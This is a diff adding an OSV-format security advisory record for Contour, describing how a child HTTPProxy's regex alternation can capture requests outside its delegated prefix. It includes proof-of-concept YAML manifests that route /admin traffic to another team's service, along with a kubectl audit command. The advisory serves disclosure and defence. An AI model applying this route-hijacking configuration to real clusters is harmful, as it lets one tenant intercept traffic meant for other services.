@@ -1,0 +1,39 @@
+{
+  "modified": "2026-10-31T20:02:34Z",
+  "published": "2026-10-31T11:03:56Z",
+  "schema_version": "1.5.0",
+  "id": "GHSA-g6qh-g3pq-5cpm",
+  "details": "### Summary\r\n\r\nWhen a root `HTTPProxy` delegates a path prefix to a child `HTTPProxy`, the child can use a regex condition to match paths outside that prefix. It can then receive requests that are meant for other routes in the same virtual host.\r\n\r\n### Details\r\n\r\nThe regex for a child route is built by combining the root prefix from `spec.includes[].conditions[].prefix` with the child regex from `spec.routes[].conditions[].regex`. The child can use alternation `|` in the regex to match paths outside the root prefix.\r\n\r\n### Proof of concept\r\n\r\nRoot `HTTPProxy` sends `/admin` to service `admin`, and includes child `HTTPProxy` `team-a/app` with prefix `/team-a`:\r\n\r\n```yaml\r\napiVersion: projectcontour.io/v1\r\nkind: HTTPProxy\r\nmetadata:\r\n  name: main\r\n  namespace: admin\r\nspec:\r\n  virtualhost:\r\n    fqdn: app.example.com\r\n  routes:\r\n  - conditions:\r\n    - prefix: /admin\r\n    services:\r\n    - name: admin\r\n      port: 80\r\n  includes:\r\n  - name: app\r\n    namespace: team-a\r\n    conditions:\r\n    - prefix: /team-a\r\n```\r\n\r\nChild `HTTPProxy` `app` uses a regex with `|`:\r\n\r\n```yaml\r\napiVersion: projectcontour.io/v1\r\nkind: HTTPProxy\r\nmetadata:\r\n  name: app\r\n  namespace: team-a\r\nspec:\r\n  routes:\r\n  - conditions:\r\n    - regex: /x|/admin/.*\r\n    services:\r\n    - name: app\r\n      port: 80\r\n```\r\n\r\nContour combines the root prefix `/team-a` and the child regex `/x|/admin/.*` into the regex match `^/team-a/x|/admin/.*`. This wrongly also matches every path that starts with `/admin/`, and as a result, requests to `http://app.example.com/admin/login` go to service `app` in namespace `team-a` instead of service `admin` in namespace `admin`.\r\n\r\nTo list the regex conditions of all HTTPProxies:\r\n\r\n```\r\nkubectl get httpproxy -A -o custom-columns='NAMESPACE:.metadata.namespace,NAME:.metadata.name,FQDN:.spec.virtualhost.fqdn,REGEX:.spec.routes[*].conditions[*].regex'\r\n```\r\n\r\nIf an HTTPProxy without FQDN has `|` in its regex, check that the regex cannot match paths outside the root prefix.\r\n\r\n### Impact\r\n\r\nUsers who can create a child `HTTPProxy` can receive requests intended for other paths on different HTTPProxies within the same virtual host.\r\n\r\n### Credits\r\n\r\nReported and patched: VMware by Broadcom\r\n\r\n",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "DHI",
+        "name": "contour",
+        "purl": "pkg:dhi/contour"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "1.26.0"
+            },
+            {
+              "fixed": "1.33.8"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source_ecosystem": "",
+        "source_package": ""
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/projectcontour/contour/security/advisories/GHSA-g6qh-g3pq-5cpm"
+    }
+  ]
+}
